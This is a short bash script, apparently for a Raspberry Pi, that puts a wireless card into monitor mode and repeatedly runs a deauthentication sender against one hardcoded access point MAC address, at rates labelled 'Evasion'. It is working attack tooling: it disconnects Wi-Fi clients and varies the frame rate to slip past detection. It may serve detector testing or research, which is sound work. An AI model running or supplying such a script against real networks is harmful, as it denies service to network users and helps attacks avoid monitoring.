#!/bin/bash
BSSID="E8:F6:54:7E:37:68"
IFACE="wlan0mon"

sudo systemctl stop pwnagotchi 2>/dev/null
sudo airmon-ng start wlan0 2>/dev/null
sudo iwconfig wlan0mon channel 3

echo "=== T3: 0.33 fps for 300s ==="
sudo python3 /home/pi/send_deauth.py $BSSID $IFACE 0.33 300
echo "=== T3 DONE. 60s gap ==="
sleep 60

for FPS in 20 15 10 8 5 3 2 1 0.5; do
    echo "=== Evasion: $FPS fps for 60s ==="
    sudo python3 /home/pi/send_deauth.py $BSSID $IFACE $FPS 60
    echo "=== 30s gap ==="
    sleep 30
done

echo "=== ALL DONE ==="
